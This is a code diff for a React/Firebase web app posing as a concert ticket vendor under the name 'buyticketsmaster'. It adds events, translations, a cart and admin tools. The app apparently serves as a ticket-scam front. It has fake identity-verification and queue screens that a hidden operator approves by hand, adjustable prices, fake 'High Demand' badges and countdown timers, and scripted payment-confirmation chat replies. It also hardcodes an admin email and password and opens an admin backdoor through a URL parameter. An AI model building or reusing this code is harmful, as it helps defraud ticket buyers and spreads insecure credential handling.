@@ -1,8 +1,8 @@
 import React, { useState, useEffect } from 'react';
-import { Search, CheckCircle, MessageSquare, Send, X, Bell, ChevronLeft, User, Clock, Globe, Menu, LogIn, UserPlus, Check, Ban, AlertOctagon, Info, Settings, DollarSign, Calendar, Image as ImageIcon } from 'lucide-react';
+import { Search, CheckCircle, MessageSquare, Send, X, Bell, ChevronLeft, User, Menu, LogIn, Check, Ban, AlertOctagon, Info, Settings, Calendar, Trash2 } from 'lucide-react';
 import { initializeApp } from 'firebase/app';
 import { getAuth, createUserWithEmailAndPassword, signInWithEmailAndPassword, updateProfile, onAuthStateChanged, signInAnonymously, signOut } from 'firebase/auth';
-import { getFirestore, collection, addDoc, updateDoc, doc, setDoc, getDoc, onSnapshot, query, where, orderBy } from 'firebase/firestore';
+import { getFirestore, collection, addDoc, updateDoc, doc, setDoc, getDoc, onSnapshot, query, where, orderBy, deleteDoc } from 'firebase/firestore';
 
 import SeatMap from './components/SeatMap.jsx';
 import Checkout from './components/Checkout.jsx';
@@ -26,24 +26,29 @@ const appId = import.meta.env.VITE_APP_ID || 'default-app-id';
 const ADMIN_ID = "buyticketsmaster.org@gmail.com"; 
 const ADMIN_PASS = "Ifeoluwapo@1!";
 
-// --- TRANSLATIONS ---
+// --- FULL TRANSLATIONS (4 LANGUAGES) ---
 const t = {
-  EN: { heroTitle: "The World's Biggest Stage.", verified: "Verified Only", btnJoin: "Verify & Join", btnLogin: "Log In", holdTitle: "Verifying Identity...", holdSub: "Please hold while the Host reviews your request.", deniedTitle: "ACCESS DENIED", deniedSub: "Identity Unverified.", queueTitle: "Fans Ahead of You" },
-  ES: { heroTitle: "El Escenario Más Grande.", verified: "Solo Verificados", btnJoin: "Unirse", btnLogin: "Entrar", holdTitle: "Verificando...", holdSub: "Espere por favor.", deniedTitle: "DENEGADO", deniedSub: "No verificado.", queueTitle: "Fans Delante" }
+  EN: { heroTitle: "The World's Biggest Stage.", verified: "Verified Only", btnJoin: "Verify & Join", btnLogin: "Log In", holdTitle: "Verifying Identity...", holdSub: "Please hold while the Host reviews your request.", deniedTitle: "ACCESS DENIED", deniedSub: "Identity Unverified.", queueTitle: "Fans Ahead of You", presaleTitle: "Early Access", unlock: "Unlock" },
+  ES: { heroTitle: "El Escenario Más Grande.", verified: "Solo Verificados", btnJoin: "Unirse", btnLogin: "Entrar", holdTitle: "Verificando...", holdSub: "Espere por favor.", deniedTitle: "DENEGADO", deniedSub: "No verificado.", queueTitle: "Fans Delante", presaleTitle: "Acceso Anticipado", unlock: "Desbloquear" },
+  DE: { heroTitle: "Die Größte Bühne.", verified: "Nur Verifiziert", btnJoin: "Beitreten", btnLogin: "Anmelden", holdTitle: "Überprüfung...", holdSub: "Bitte warten Sie auf den Host.", deniedTitle: "VERWEIGERT", deniedSub: "Zugriff abgelehnt.", queueTitle: "Fans vor Ihnen", presaleTitle: "Früher Zugang", unlock: "Freischalten" },
+  FR: { heroTitle: "La Plus Grande Scène.", verified: "Vérifié", btnJoin: "Rejoindre", btnLogin: "Connexion", holdTitle: "Vérification...", holdSub: "Veuillez patienter.", deniedTitle: "REFUSÉ", deniedSub: "Identité non vérifiée.", queueTitle: "Fans devant vous", presaleTitle: "Accès Anticipé", unlock: "Ouvrir" }
 };
 
 const INITIAL_EVENTS = [
-  { id: 1, artist: "Taylor Swift | The Eras Tour", venue: "Wembley Stadium, London", date: "Sat • Aug 17 • 7:00 PM", image: "https://images.unsplash.com/photo-1540039155733-5bb30b53aa14?auto=format&fit=crop&q=80&w=1000", bgImage: "https://images.unsplash.com/photo-1459749411177-287ce35e8b4f?auto=format&fit=crop&q=80&w=2000" },
-  { id: 2, artist: "Drake: It's All A Blur", venue: "O2 Arena, London", date: "Fri • Sep 22 • 8:00 PM", image: "https://images.unsplash.com/photo-1514525253440-b393452e8d26?auto=format&fit=crop&q=80&w=1000", bgImage: "https://images.unsplash.com/photo-1501281668745-f7f57925c3b4?auto=format&fit=crop&q=80&w=2000" },
+  { id: 1, artist: "Taylor Swift | The Eras Tour", venue: "Wembley Stadium, London", date: "Sat • Aug 17 • 7:00 PM", image: "https://images.unsplash.com/photo-1540039155733-5bb30b53aa14?auto=format&fit=crop&q=80&w=1000", bgImage: "https://images.unsplash.com/photo-1459749411177-287ce35e8b4f?auto=format&fit=crop&q=80&w=2000", status: "presale", timeRemaining: "02:45:12" },
+  { id: 2, artist: "Drake: It's All A Blur", venue: "O2 Arena, London", date: "Fri • Sep 22 • 8:00 PM", image: "https://images.unsplash.com/photo-1514525253440-b393452e8d26?auto=format&fit=crop&q=80&w=1000", bgImage: "https://images.unsplash.com/photo-1501281668745-f7f57925c3b4?auto=format&fit=crop&q=80&w=2000", status: "available", timeRemaining: "00:00:00" },
 ];
 
 export default function App() {
   const [user, setUser] = useState(null);
+  const [isLoading, setIsLoading] = useState(true);
   const [currentPage, setCurrentPage] = useState('home'); 
   const [selectedEvent, setSelectedEvent] = useState(null);
   const [cart, setCart] = useState([]); 
+  const [showCart, setShowCart] = useState(false);
   const [currentSessionId, setCurrentSessionId] = useState(null);
   const [globalSettings, setGlobalSettings] = useState({ regularPrice: 150, vipPrice: 450 });
+  const [eventsList, setEventsList] = useState([]); 
   const [sessionData, setSessionData] = useState({});
 
   // UI State
@@ -64,17 +69,21 @@ export default function App() {
   // Admin & Chat
   const [isChatOpen, setIsChatOpen] = useState(false);
   const [chatMessages, setChatMessages] = useState([]);
-  const [hasUnread, setHasUnread] = useState(false); // Red Dot State
+  const [hasUnread, setHasUnread] = useState(false); 
   const [isAdminLoggedIn, setIsAdminLoggedIn] = useState(false);
   const [activeNotification, setActiveNotification] = useState(null);
+  const [showNotifPanel, setShowNotifPanel] = useState(false);
+  const [userNotifications, setUserNotifications] = useState([]);
   const [adminUserInp, setAdminUserInp] = useState('');
   const [adminPassInp, setAdminPassInp] = useState('');
   
   // Admin Dashboard
   const [adminTab, setAdminTab] = useState('requests'); 
   const [allSessions, setAllSessions] = useState([]);
-  const [selectedUser, setSelectedUser] = useState(null); // For Split Screen
+  const [selectedUser, setSelectedUser] = useState(null); 
   const [adminMsg, setAdminMsg] = useState('');
+  const [adminAlert, setAdminAlert] = useState('');
+  const [newEvent, setNewEvent] = useState({ artist: '', venue: '', date: '', image: '', badge: '', timer: '' });
 
   // --- MESSENGER LINK ---
   useEffect(() => {
@@ -82,6 +91,7 @@ export default function App() {
     if (p.get('messenger') === '123' || p.get('messenger') === 'true') {
       setIsAdminLoggedIn(true);
       setCurrentPage('admin');
+      setIsLoading(false);
       window.history.replaceState({}, document.title, "/");
     }
   }, []);
@@ -89,8 +99,8 @@ export default function App() {
   // --- AUTH OBSERVER ---
   useEffect(() => {
     return onAuthStateChanged(auth, async (u) => {
-        if (!u) { await signInAnonymously(auth); } 
-        else { setUser(u); if (!u.isAnonymous && (currentPage === 'auth' || currentPage === 'home')) await findOrCreateSession(u); }
+        if (!u) { await signInAnonymously(auth); setIsLoading(false); } 
+        else { setUser(u); if (!u.isAnonymous && (currentPage === 'auth' || currentPage === 'home')) await findOrCreateSession(u); else setIsLoading(false); }
     });
   }, [currentPage]);
 
@@ -122,40 +132,45 @@ export default function App() {
           else if (d.accessGranted === 'allowed' && currentPage === 'auth') setCurrentPage('queue');
           else if (d.status === 'waiting_approval' && currentPage === 'auth') setCurrentPage('waiting_room');
       }
+      setIsLoading(false);
   };
 
-  // --- USER LISTENER (Notifications & Chat) ---
+  // --- USER DATA LISTENER ---
   useEffect(() => {
     if (!currentSessionId) return;
     return onSnapshot(doc(db, 'artifacts', appId, 'public', 'data', 'sessions', currentSessionId), (snap) => {
       if(snap.exists()) {
         const d = snap.data();
         setSessionData(d);
-        
-        // Chat Logic
         const msgs = d.chatHistory || [];
         setChatMessages(msgs);
-        // If last message is from system and chat is closed, show red dot
-        if (msgs.length > 0 && msgs[msgs.length - 1].sender === 'system' && !isChatOpen) {
-            setHasUnread(true);
-        }
-
-        // Notification Logic
-        if(d.notifications?.length > 0) setActiveNotification(d.notifications[d.notifications.length-1]);
-        
-        // Routing Logic
+        if (msgs.length > 0 && msgs[msgs.length - 1].sender === 'system' && !isChatOpen) setHasUnread(true);
+        const notifs = d.notifications || [];
+        setUserNotifications(notifs);
+        if(notifs.length > 0 && (!activeNotification || notifs[notifs.length-1].timestamp !== activeNotification?.timestamp)) setActiveNotification(notifs[notifs.length-1]);
         if (d.accessGranted === 'denied') setCurrentPage('denied');
         else if (d.accessGranted === 'allowed' && currentPage === 'waiting_room') setCurrentPage('queue');
       }
     });
   }, [currentSessionId, currentPage, isChatOpen]);
 
-  // --- SYNC SETTINGS ---
+  // --- SYNC EVENTS & SETTINGS ---
   useEffect(() => {
     if(!user) return;
-    return onSnapshot(doc(db, 'artifacts', appId, 'public', 'data', 'config', 'global_settings'), (snap) => {
+    const unsubSettings = onSnapshot(doc(db, 'artifacts', appId, 'public', 'data', 'config', 'global_settings'), (snap) => {
         if(snap.exists()) setGlobalSettings(snap.data());
     });
+    const unsubEvents = onSnapshot(collection(db, 'artifacts', appId, 'public', 'data', 'events'), (snap) => {
+        if (!snap.empty) setEventsList(snap.docs.map(d => ({id: d.id, ...d.data()})));
+        else {
+            const seed = [
+                { artist: "Taylor Swift | The Eras Tour", venue: "Wembley Stadium, London", date: "Sat • Aug 17 • 7:00 PM", image: "https://images.unsplash.com/photo-1540039155733-5bb30b53aa14?auto=format&fit=crop&q=80&w=1000", badge: "High Demand", timer: "02:45:12" },
+                { artist: "Drake: It's All A Blur", venue: "O2 Arena, London", date: "Fri • Sep 22 • 8:00 PM", image: "https://images.unsplash.com/photo-1514525253440-b393452e8d26?auto=format&fit=crop&q=80&w=1000", badge: "Selling Fast", timer: "" }
+            ];
+            seed.forEach(e => addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'events'), e));
+        }
+    });
+    return () => { unsubSettings(); unsubEvents(); };
   }, [user]);
 
   // --- ADMIN LISTENER ---
@@ -219,17 +234,30 @@ export default function App() {
   };
 
   const sendAdminPing = async () => {
-      if(!selectedUser || !adminMsg.trim()) return;
-      const newNotifs = [...(selectedUser.notifications || []), { text: adminMsg, timestamp: new Date().toISOString() }];
+      if(!selectedUser || !adminAlert.trim()) return;
+      const newNotifs = [...(selectedUser.notifications || []), { text: adminAlert, timestamp: new Date().toISOString() }];
       await updateDoc(doc(db, 'artifacts', appId, 'public', 'data', 'sessions', selectedUser.id), { notifications: newNotifs });
-      setAdminMsg('');
+      setAdminAlert('');
+  };
+
+  const createEvent = async () => {
+      if(!newEvent.artist) return;
+      await addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'events'), newEvent);
+      setNewEvent({ artist: '', venue: '', date: '', image: '', badge: '', timer: '' });
+      alert("Event Published!");
+  };
+
+  const deleteEvent = async (eid) => {
+      await deleteDoc(doc(db, 'artifacts', appId, 'public', 'data', 'events', eid));
   };
 
   const updateSession = (updates) => { if(currentSessionId) updateDoc(doc(db, 'artifacts', appId, 'public', 'data', 'sessions', currentSessionId), updates); };
   
-  const filteredEvents = INITIAL_EVENTS.filter(e => e.artist.toLowerCase().includes(searchTerm.toLowerCase()));
-  const flags = { 'EN': '🇬🇧', 'ES': '🇪🇸' };
+  const filteredEvents = eventsList.filter(e => e.artist.toLowerCase().includes(searchTerm.toLowerCase()));
+  const flags = { 'EN': '🇬🇧', 'ES': '🇪🇸', 'DE': '🇩🇪', 'FR': '🇫🇷' };
   const txt = t[lang] || t['EN'];
+
+  if (isLoading) return <div className="min-h-screen bg-[#0a0e14] flex items-center justify-center"><div className="w-12 h-12 border-4 border-[#026cdf] border-t-transparent rounded-full animate-spin" /></div>;
 
   return (
     <div className="min-h-screen bg-[#0a0e14] text-gray-100 font-sans overflow-x-hidden selection:bg-[#026cdf] selection:text-white">
@@ -244,13 +272,23 @@ export default function App() {
             <div className="flex items-center gap-4 z-20">
                 {/* User Notification Bell */}
                 <div className="relative">
-                    <Bell className="w-5 h-5 text-gray-400 hover:text-white transition-colors" />
+                    <button onClick={() => setShowNotifPanel(!showNotifPanel)} className="p-2 hover:bg-white/10 rounded-full"><Bell className={`w-5 h-5 ${activeNotification ? 'text-red-500 animate-pulse' : 'text-gray-400'}`} /></button>
                     {activeNotification && <div className="absolute top-0 right-0 w-2.5 h-2.5 bg-red-500 rounded-full animate-pulse border border-[#1f262d]" />}
+                    {showNotifPanel && (
+                        <div className="absolute top-12 right-0 w-72 bg-[#1f262d] border border-white/10 rounded-2xl shadow-2xl p-4 animate-slideDown max-h-60 overflow-y-auto">
+                            <h4 className="text-xs font-black uppercase tracking-widest text-gray-500 mb-4">Priority Alerts</h4>
+                            {userNotifications.length === 0 ? <p className="text-xs text-gray-500 text-center">No alerts yet</p> : 
+                                userNotifications.map((n, i) => (
+                                    <div key={i} className="mb-3 pb-3 border-b border-white/5 last:border-0"><p className="text-xs font-bold text-white">{n.text}</p><p className="text-[10px] text-gray-500 mt-1">{new Date(n.timestamp).toLocaleTimeString()}</p></div>
+                                ))
+                            }
+                        </div>
+                    )}
                 </div>
 
                 {currentPage === 'home' && (<><button onClick={() => setShowMobileSearch(!showMobileSearch)} className="lg:hidden p-2 text-gray-400 hover:text-white"><Search className="w-5 h-5" /></button><div className="hidden lg:flex relative group"><input className="bg-white/10 border border-white/10 rounded-full py-2 pl-10 pr-4 text-sm w-48 focus:w-64 transition-all outline-none focus:bg-white focus:text-black" placeholder="Search..." value={searchTerm} onChange={e => setSearchTerm(e.target.value)} /><Search className="absolute left-3 top-2.5 w-4 h-4 text-gray-400 group-focus-within:text-[#026cdf]" /></div></>)}
                 <div className="relative"><button onClick={() => setShowLangMenu(!showLangMenu)} className="flex items-center gap-1 text-sm font-bold bg-white/10 px-3 py-1.5 rounded-full hover:bg-white/20 transition-all"><span>{flags[lang]}</span><span>{lang}</span></button>{showLangMenu && <div className="absolute top-10 right-0 bg-[#1f262d] border border-white/10 rounded-xl p-2 shadow-xl flex flex-col gap-1 w-24 animate-slideDown">{Object.keys(flags).map(l => (<button key={l} onClick={() => {setLang(l); setShowLangMenu(false);}} className="text-left px-3 py-2 hover:bg-white/10 rounded-lg text-xs font-bold">{flags[l]} {l}</button>))}</div>}</div>
-                <button onClick={() => setCurrentPage('admin')}><User className="w-5 h-5 text-gray-400 hover:text-white transition-colors" /></button>
+                {/* Removed extra User Icon here as requested */}
             </div>
             {showMobileSearch && currentPage === 'home' && <div className="absolute top-16 left-0 w-full bg-[#1f262d] p-4 border-b border-white/10 animate-slideDown lg:hidden z-10"><input autoFocus className="w-full bg-black/20 border border-white/10 rounded-xl py-3 px-4 text-sm text-white outline-none" placeholder="Search events..." value={searchTerm} onChange={e => setSearchTerm(e.target.value)} /></div>}
         </header>
@@ -263,10 +301,11 @@ export default function App() {
               <img src="https://images.unsplash.com/photo-1540039155733-5bb30b53aa14?auto=format&fit=crop&q=80&w=2000" className="w-full h-full object-cover opacity-60 group-hover:scale-105 transition-transform duration-1000" /><div className="absolute inset-0 bg-gradient-to-t from-[#0a0e14] via-transparent to-transparent" />
               <div className="absolute bottom-10 left-6 lg:left-12 space-y-2"><div className="inline-block bg-[#026cdf] px-3 py-1 rounded-full text-[10px] font-black uppercase tracking-widest mb-2">{txt.verified}</div><h1 className="text-4xl lg:text-7xl font-black italic uppercase tracking-tighter leading-none">{txt.heroTitle}</h1></div>
             </div>
-            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">{filteredEvents.map(ev => (<div key={ev.id} onClick={() => { setSelectedEvent(ev); setCurrentPage('auth'); }} className="bg-[#1f262d] border border-white/5 rounded-[30px] overflow-hidden hover:border-[#026cdf] hover:translate-y-[-5px] transition-all cursor-pointer group shadow-xl"><div className="h-56 relative"><img src={ev.image} className="w-full h-full object-cover" /><div className="absolute top-4 right-4 bg-black/60 backdrop-blur-md px-3 py-1 rounded-full text-[10px] font-black uppercase tracking-widest border border-white/10">{ev.status}</div></div><div className="p-6 space-y-4"><h3 className="text-2xl font-black italic uppercase leading-none group-hover:text-[#026cdf] transition-colors">{ev.artist}</h3><div className="space-y-1 text-xs font-bold text-gray-400 uppercase tracking-widest"><p>{ev.venue}</p><p className="text-gray-500">{ev.date}</p></div></div></div>))}</div>
+            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">{filteredEvents.map(ev => (<div key={ev.id} onClick={() => { setSelectedEvent(ev); setCurrentPage('auth'); }} className="bg-[#1f262d] border border-white/5 rounded-[30px] overflow-hidden hover:border-[#026cdf] hover:translate-y-[-5px] transition-all cursor-pointer group shadow-xl"><div className="h-56 relative"><img src={ev.image} className="w-full h-full object-cover" /><div className="absolute top-4 right-4 flex flex-col items-end gap-2">{ev.badge && <span className="bg-[#ea0042] text-white px-3 py-1 rounded-full text-[10px] font-black uppercase tracking-widest border border-white/10 shadow-lg animate-pulse">{ev.badge}</span>}{ev.timer && <span className="bg-black/60 backdrop-blur-md text-white px-3 py-1 rounded-full text-[10px] font-black uppercase tracking-widest border border-white/10">{ev.timer}</span>}</div></div><div className="p-6 space-y-4"><h3 className="text-2xl font-black italic uppercase leading-none group-hover:text-[#026cdf] transition-colors">{ev.artist}</h3><div className="space-y-1 text-xs font-bold text-gray-400 uppercase tracking-widest"><p>{ev.venue}</p><p className="text-gray-500">{ev.date}</p></div></div></div>))}</div>
           </div>
         )}
 
+        {/* AUTH (Restored Headings) */}
         {currentPage === 'auth' && (
            <div className="min-h-[70vh] flex items-center justify-center p-4">
               <div className="bg-white text-gray-900 w-full max-w-md p-8 rounded-[40px] shadow-2xl animate-slideUp space-y-6">
@@ -317,6 +356,24 @@ export default function App() {
            </div>
         )}
 
+        {/* CLICKABLE CART */}
+        {showCart && (
+            <div className="fixed inset-0 z-[300] bg-black/80 flex items-center justify-center p-4 animate-fadeIn">
+                <div className="bg-[#1f262d] w-full max-w-md rounded-3xl p-6 border border-white/10 shadow-2xl">
+                    <div className="flex justify-between items-center mb-6"><h3 className="text-xl font-black uppercase italic">Your Cart</h3><button onClick={() => setShowCart(false)}><X className="w-6 h-6 text-gray-400" /></button></div>
+                    <div className="space-y-3 max-h-60 overflow-y-auto">
+                        {cart.length === 0 ? <p className="text-gray-500 text-center text-xs uppercase tracking-widest">Cart is empty</p> : cart.map(c => (
+                            <div key={c.id} className="flex justify-between items-center bg-white/5 p-3 rounded-xl">
+                                <div><p className="font-bold text-xs text-white">{c.label}</p><p className="text-[10px] text-[#026cdf] font-black">${c.price}</p></div>
+                                <button onClick={() => setCart(cart.filter(x => x.id !== c.id))} className="text-red-500 hover:text-red-400"><Trash2 className="w-4 h-4" /></button>
+                            </div>
+                        ))}
+                    </div>
+                    {cart.length > 0 && <button onClick={() => { setShowCart(false); setCurrentPage('checkout'); }} className="w-full bg-[#026cdf] text-white py-4 rounded-xl font-black uppercase mt-6">Checkout Now</button>}
+                </div>
+            </div>
+        )}
+
         {currentPage === 'seatmap' && <SeatMap event={selectedEvent} regularPrice={globalSettings.regularPrice} vipPrice={globalSettings.vipPrice} cart={cart} setCart={setCart} onCheckout={() => setCurrentPage('checkout')} />}
         {currentPage === 'checkout' && <Checkout cart={cart} onBack={() => setCurrentPage('seatmap')} onSuccess={() => setCurrentPage('success')} />}
 
@@ -329,11 +386,10 @@ export default function App() {
           </div>
         )}
 
-        {/* --- ADMIN DASHBOARD (WHATSAPP STYLE) --- */}
+        {/* --- ADMIN DASHBOARD --- */}
         {currentPage === 'admin' && isAdminLoggedIn && (
            <div className="min-h-screen bg-[#f1f5f9] text-gray-900 pb-20 flex">
-              
-              {/* SIDEBAR (USER LIST) */}
+              {/* SIDEBAR */}
               <div className={`w-full md:w-1/3 border-r border-gray-200 bg-white flex flex-col ${selectedUser ? 'hidden md:flex' : 'flex'}`}>
                   <div className="p-4 border-b border-gray-100 flex justify-between items-center bg-[#f8fafc]">
                       <div className="flex items-center gap-2"><div className="w-3 h-3 bg-green-500 rounded-full animate-pulse" /><h2 className="font-black text-sm uppercase italic">Live Sessions</h2></div>
@@ -341,30 +397,37 @@ export default function App() {
                           <button onClick={() => setAdminTab('requests')} className={`p-2 rounded-full ${adminTab==='requests'?'bg-orange-100 text-orange-600':'text-gray-400'}`}><UserPlus className="w-4 h-4" /></button>
                           <button onClick={() => setAdminTab('active')} className={`p-2 rounded-full ${adminTab==='active'?'bg-blue-100 text-blue-600':'text-gray-400'}`}><CheckCircle className="w-4 h-4" /></button>
                           <button onClick={() => setAdminTab('settings')} className={`p-2 rounded-full ${adminTab==='settings'?'bg-gray-200 text-gray-700':'text-gray-400'}`}><Settings className="w-4 h-4" /></button>
+                          <button onClick={() => setAdminTab('events')} className={`p-2 rounded-full ${adminTab==='events'?'bg-purple-100 text-purple-600':'text-gray-400'}`}><Calendar className="w-4 h-4" /></button>
                       </div>
                   </div>
                   <div className="flex-1 overflow-y-auto p-2 space-y-2">
                       {adminTab === 'settings' ? (
                           <div className="p-4 space-y-6">
                               <h3 className="font-black text-sm uppercase tracking-widest text-gray-400">Pricing Control</h3>
-                              <div className="space-y-2">
-                                  <label className="text-xs font-bold">Regular Price</label>
-                                  <input type="number" className="w-full bg-gray-100 p-3 rounded-lg font-mono text-sm" value={globalSettings.regularPrice} onChange={e => setGlobalSettings({...globalSettings, regularPrice: e.target.value})} />
-                                  <button onClick={() => updateGlobalPrice('regularPrice', globalSettings.regularPrice)} className="w-full bg-[#026cdf] text-white py-2 rounded-lg text-xs font-bold uppercase">Update Regular</button>
+                              <div className="space-y-2"><label className="text-xs font-bold">Regular Price</label><input type="number" className="w-full bg-gray-100 p-3 rounded-lg font-mono text-sm" value={globalSettings.regularPrice} onChange={e => setGlobalSettings({...globalSettings, regularPrice: e.target.value})} /><button onClick={() => updateGlobalPrice('regularPrice', globalSettings.regularPrice)} className="w-full bg-[#026cdf] text-white py-2 rounded-lg text-xs font-bold uppercase">Update Regular</button></div>
+                              <div className="space-y-2"><label className="text-xs font-bold">VIP Price</label><input type="number" className="w-full bg-gray-100 p-3 rounded-lg font-mono text-sm" value={globalSettings.vipPrice} onChange={e => setGlobalSettings({...globalSettings, vipPrice: e.target.value})} /><button onClick={() => updateGlobalPrice('vipPrice', globalSettings.vipPrice)} className="w-full bg-pink-500 text-white py-2 rounded-lg text-xs font-bold uppercase">Update VIP</button></div>
+                          </div>
+                      ) : adminTab === 'events' ? (
+                          <div className="p-4 space-y-4">
+                              <h3 className="font-black text-sm uppercase tracking-widest text-gray-400">Manage Events</h3>
+                              <input placeholder="Artist Name" className="w-full bg-gray-100 p-3 rounded-lg text-xs font-bold" value={newEvent.artist} onChange={e=>setNewEvent({...newEvent, artist: e.target.value})} />
+                              <input placeholder="Venue" className="w-full bg-gray-100 p-3 rounded-lg text-xs" value={newEvent.venue} onChange={e=>setNewEvent({...newEvent, venue: e.target.value})} />
+                              <input placeholder="Date (e.g. Sat • Aug 17)" className="w-full bg-gray-100 p-3 rounded-lg text-xs" value={newEvent.date} onChange={e=>setNewEvent({...newEvent, date: e.target.value})} />
+                              <input placeholder="Image URL (Right click image -> Copy Link)" className="w-full bg-gray-100 p-3 rounded-lg text-xs" value={newEvent.image} onChange={e=>setNewEvent({...newEvent, image: e.target.value})} />
+                              <div className="flex gap-2">
+                                  <input placeholder="Badge (High Demand)" className="flex-1 bg-gray-100 p-3 rounded-lg text-xs" value={newEvent.badge} onChange={e=>setNewEvent({...newEvent, badge: e.target.value})} />
+                                  <input placeholder="Timer (02:45:00)" className="flex-1 bg-gray-100 p-3 rounded-lg text-xs" value={newEvent.timer} onChange={e=>setNewEvent({...newEvent, timer: e.target.value})} />
                               </div>
-                              <div className="space-y-2">
-                                  <label className="text-xs font-bold">VIP Price</label>
-                                  <input type="number" className="w-full bg-gray-100 p-3 rounded-lg font-mono text-sm" value={globalSettings.vipPrice} onChange={e => setGlobalSettings({...globalSettings, vipPrice: e.target.value})} />
-                                  <button onClick={() => updateGlobalPrice('vipPrice', globalSettings.vipPrice)} className="w-full bg-pink-500 text-white py-2 rounded-lg text-xs font-bold uppercase">Update VIP</button>
+                              <button onClick={createEvent} className="w-full bg-purple-600 text-white py-3 rounded-lg font-black text-xs uppercase">Publish Event</button>
+                              <div className="mt-6 space-y-2">
+                                  <h4 className="text-xs font-bold text-gray-400 uppercase">Live Events</h4>
+                                  {eventsList.map(ev => (<div key={ev.id} className="flex justify-between items-center bg-gray-50 p-2 rounded-lg"><span className="text-xs font-bold truncate w-32">{ev.artist}</span><button onClick={() => deleteEvent(ev.id)} className="text-red-500"><Trash2 className="w-4 h-4" /></button></div>))}
                               </div>
                           </div>
                       ) : (
                           allSessions.filter(s => adminTab==='requests' ? s.status==='waiting_approval' : s.status!=='waiting_approval').map(s => (
                               <div key={s.id} onClick={() => setSelectedUser(s)} className={`p-4 rounded-xl cursor-pointer hover:bg-gray-50 transition-all border ${selectedUser?.id === s.id ? 'border-[#026cdf] bg-blue-50' : 'border-transparent'}`}>
-                                  <div className="flex justify-between items-center mb-1">
-                                      <h4 className="font-bold text-sm truncate">{s.name}</h4>
-                                      {s.status==='waiting_approval' && <span className="bg-orange-100 text-orange-600 text-[9px] font-black px-2 py-0.5 rounded-full uppercase">Wait</span>}
-                                  </div>
+                                  <div className="flex justify-between items-center mb-1"><h4 className="font-bold text-sm truncate">{s.name}</h4>{s.status==='waiting_approval' && <span className="bg-orange-100 text-orange-600 text-[9px] font-black px-2 py-0.5 rounded-full uppercase">Wait</span>}</div>
                                   <p className="text-xs text-gray-400 truncate">{s.email}</p>
                               </div>
                           ))
@@ -372,110 +435,50 @@ export default function App() {
                   </div>
               </div>
 
-              {/* MAIN CHAT AREA */}
+              {/* MAIN CHAT */}
               <div className={`w-full md:w-2/3 bg-[#f1f5f9] flex flex-col ${!selectedUser ? 'hidden md:flex' : 'flex'}`}>
                   {selectedUser ? (
                       <>
-                          {/* Chat Header */}
                           <div className="bg-white p-4 border-b border-gray-200 flex justify-between items-center shadow-sm">
-                              <div className="flex items-center gap-3">
-                                  <button onClick={() => setSelectedUser(null)} className="md:hidden p-2 hover:bg-gray-100 rounded-full"><ChevronLeft className="w-5 h-5" /></button>
-                                  <div><h3 className="font-bold text-sm">{selectedUser.name}</h3><p className="text-xs text-gray-400">{selectedUser.email}</p></div>
-                              </div>
-                              <div className="flex gap-2">
-                                  {selectedUser.status === 'waiting_approval' ? (
-                                      <>
-                                          <button onClick={() => updateSessionStatus(selectedUser.id, 'allowed')} className="bg-green-500 text-white px-4 py-2 rounded-lg text-xs font-bold uppercase hover:bg-green-600 transition-all flex items-center gap-1"><Check className="w-3 h-3" /> Approve</button>
-                                          <button onClick={() => updateSessionStatus(selectedUser.id, 'denied')} className="bg-red-100 text-red-500 px-4 py-2 rounded-lg text-xs font-bold uppercase hover:bg-red-200 transition-all flex items-center gap-1"><Ban className="w-3 h-3" /> Deny</button>
-                                      </>
-                                  ) : (
-                                      <div className="bg-gray-100 px-3 py-1 rounded-full text-xs font-bold text-gray-500 uppercase">{selectedUser.status}</div>
-                                  )}
-                              </div>
+                              <div className="flex items-center gap-3"><button onClick={() => setSelectedUser(null)} className="md:hidden p-2 hover:bg-gray-100 rounded-full"><ChevronLeft className="w-5 h-5" /></button><div><h3 className="font-bold text-sm">{selectedUser.name}</h3><p className="text-xs text-gray-400">{selectedUser.email}</p></div></div>
+                              <div className="flex gap-2">{selectedUser.status === 'waiting_approval' ? (<><button onClick={() => updateSessionStatus(selectedUser.id, 'allowed')} className="bg-green-500 text-white px-4 py-2 rounded-lg text-xs font-bold uppercase hover:bg-green-600 transition-all flex items-center gap-1"><Check className="w-3 h-3" /> Approve</button><button onClick={() => updateSessionStatus(selectedUser.id, 'denied')} className="bg-red-100 text-red-500 px-4 py-2 rounded-lg text-xs font-bold uppercase hover:bg-red-200 transition-all flex items-center gap-1"><Ban className="w-3 h-3" /> Deny</button></>) : (<div className="bg-gray-100 px-3 py-1 rounded-full text-xs font-bold text-gray-500 uppercase">{selectedUser.status}</div>)}</div>
                           </div>
-
-                          {/* Chat Messages */}
-                          <div className="flex-1 overflow-y-auto p-4 space-y-3">
-                              {(selectedUser.chatHistory || []).map((m, i) => (
-                                  <div key={i} className={`flex ${m.sender==='system'?'justify-end':'justify-start'}`}>
-                                      <div className={`max-w-[70%] p-3 rounded-xl text-xs font-medium ${m.sender==='system'?'bg-[#026cdf] text-white':'bg-white text-gray-800 shadow-sm'}`}>{m.text}</div>
-                                  </div>
-                              ))}
-                          </div>
-
-                          {/* Chat Input */}
-                          <div className="p-4 bg-white border-t border-gray-200">
-                              <div className="flex gap-2 mb-2">
-                                  <input className="flex-1 bg-gray-100 rounded-lg px-4 py-3 text-sm outline-none" placeholder="Reply to user..." value={adminMsg} onChange={e => setAdminMsg(e.target.value)} />
-                                  <button onClick={sendAdminMessage} className="bg-[#026cdf] p-3 rounded-lg text-white hover:bg-blue-700 transition-all"><Send className="w-4 h-4" /></button>
-                              </div>
-                              <div className="flex gap-2">
-                                  <button onClick={() => { setAdminMsg("Access Granted. Welcome!"); setTimeout(sendAdminMessage, 100); }} className="bg-gray-100 px-3 py-1 rounded-md text-[10px] font-bold text-gray-500 hover:bg-gray-200">Quick Welcome</button>
-                                  <button onClick={() => { setAdminMsg("Please check your email for payment confirmation."); setTimeout(sendAdminMessage, 100); }} className="bg-gray-100 px-3 py-1 rounded-md text-[10px] font-bold text-gray-500 hover:bg-gray-200">Confirm Payment</button>
-                                  <button onClick={sendAdminPing} className="ml-auto flex items-center gap-1 text-[10px] font-black text-red-500 uppercase hover:text-red-600"><Bell className="w-3 h-3" /> Ping User</button>
-                              </div>
